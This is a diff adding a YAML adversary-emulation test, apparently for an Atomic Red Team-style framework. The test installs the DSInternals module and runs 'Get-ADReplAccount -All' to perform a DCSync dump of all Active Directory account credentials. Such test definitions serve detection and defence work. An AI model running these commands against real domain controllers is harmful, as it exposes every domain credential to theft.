@@ -1,0 +1,34 @@
+api_version: "2.0"
+name: Run DSInternals Get-ADReplAccount
+description: "The following Atomic will run Get-ADReplAccount from DSInternals.\nUpon successful execution, domain and credentials will appear in stdout. \n[Reference](https://www.crowdstrike.com/blog/observations-from-the-stellarparticle-campaign/) CrowdStrike StellarParticle.\nhttps://www.dsinternals.com/en/retrieving-active-directory-passwords-remotely/\n"
+args:
+    - name: logonserver
+      type: string
+      default: $ENV:logonserver.TrimStart("\")
+uuid: a0bced08-3fc5-4d8b-93b7-e8344739376e
+mitre:
+    tactics:
+        - 'TA0006: Credential Access'
+    techniques:
+        - 'T1003: OS Credential Dumping'
+    subtechniques:
+        - 'T1003.006: DCSync'
+requirements:
+    platforms:
+        - os: windows
+steps:
+    - name: |
+        DSInternals must be installed
+      inline: |
+        $RequiredModule = Get-Module -Name DSInternals -ListAvailable
+        if (-not $RequiredModule) {{Install-Module -Name DSInternals -Scope CurrentUser -Force
+        }}
+        if (-not $RequiredModule.ExportedCommands['DSInternals']) {exit 1} else {exit 0}
+      executor: powershell
+    - name: run-dsinternals-get-adreplaccount
+      inline: |
+        Get-ADReplAccount -All -Server {{.Args.logonserver}}
+      executor: powershell
+      cleanup:
+        inline: ""
+        executor: powershell
